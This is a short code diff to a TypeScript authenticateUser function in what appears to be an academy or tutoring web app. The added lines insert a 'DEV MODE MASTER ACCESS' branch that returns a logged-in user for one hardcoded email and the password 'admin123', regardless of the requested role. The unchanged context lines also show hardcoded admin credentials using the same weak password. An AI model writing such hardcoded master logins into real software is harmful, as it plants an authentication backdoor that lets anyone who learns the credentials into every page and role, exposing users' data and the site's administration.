@@ -1192,6 +1192,11 @@ export const authenticateUser = (email: string, password: string, role: string):
   const normEmail = (email || '').trim().toLowerCase();
   const normPass = (password || '').trim();
 
+  // DEV MODE MASTER ACCESS - Grants full access to all pages & roles
+  if (normEmail === 'lakshya@dev.com' && normPass === 'admin123') {
+    return { id: 'dev-lakshya', name: 'Lakshya (Dev Mode)' };
+  }
+
   if (role === 'admin') {
     if ((normEmail === 'admin@sankalpacademy.com' || normEmail === 'admin@rctutorials.com' || normEmail === 'admin') && normPass === 'admin123') {
       return { id: 'admin', name: 'Administrator' };
